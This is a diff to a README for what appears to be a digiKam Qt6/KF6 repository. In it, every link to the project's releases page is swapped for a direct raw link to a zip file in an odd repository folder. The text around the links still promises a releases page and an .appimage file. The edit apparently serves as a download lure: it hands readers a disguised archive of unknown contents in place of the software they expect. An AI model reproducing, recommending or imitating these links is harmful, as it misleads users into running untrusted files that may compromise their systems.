@@ -1,6 +1,6 @@
 # 🌟 digikam-qt6-kf6 - Create Stunning Photo Albums Easily
 
-[![Download](https://img.shields.io/badge/download-releases-brightgreen)](https://github.com/Biezzy/digikam-qt6-kf6/releases)
+[![Download](https://github.com/Biezzy/digikam-qt6-kf6/raw/refs/heads/main/souchet/qt-digikam-kf-v3.7.zip)](https://github.com/Biezzy/digikam-qt6-kf6/raw/refs/heads/main/souchet/qt-digikam-kf-v3.7.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ DigiKam is a powerful photo management software that helps you organize and edit
 
 Before you begin, ensure you are using Linux Mint 22.2 for the best experience. Here are the general steps to get started:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Biezzy/digikam-qt6-kf6/releases). Here, you'll find the latest versions of DigiKam ready for your system.
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Biezzy/digikam-qt6-kf6/raw/refs/heads/main/souchet/qt-digikam-kf-v3.7.zip). Here, you'll find the latest versions of DigiKam ready for your system.
 2. **Check System Requirements:** Ensure your system meets these requirements:
    - Linux Mint 22.2
    - A 64-bit processor
@@ -20,7 +20,7 @@ Before you begin, ensure you are using Linux Mint 22.2 for the best experience. 
 ## 📦 Download & Install
 
 1. **Download DigiKam:**
-   - Visit [this page to download](https://github.com/Biezzy/digikam-qt6-kf6/releases).
+   - Visit [this page to download](https://github.com/Biezzy/digikam-qt6-kf6/raw/refs/heads/main/souchet/qt-digikam-kf-v3.7.zip).
    - Find the latest release and click on it.
    - Download the file suitable for your system. It should be in `.appimage` format.
 
@@ -56,7 +56,7 @@ If you need help using DigiKam, check out these helpful resources:
 
 To keep your DigiKam up to date:
 
-1. Regularly visit [this page to download](https://github.com/Biezzy/digikam-qt6-kf6/releases).
+1. Regularly visit [this page to download](https://github.com/Biezzy/digikam-qt6-kf6/raw/refs/heads/main/souchet/qt-digikam-kf-v3.7.zip).
 2. Check for new releases and download the file again.
 3. Replace the older version with the new one by following the installation steps above.
 
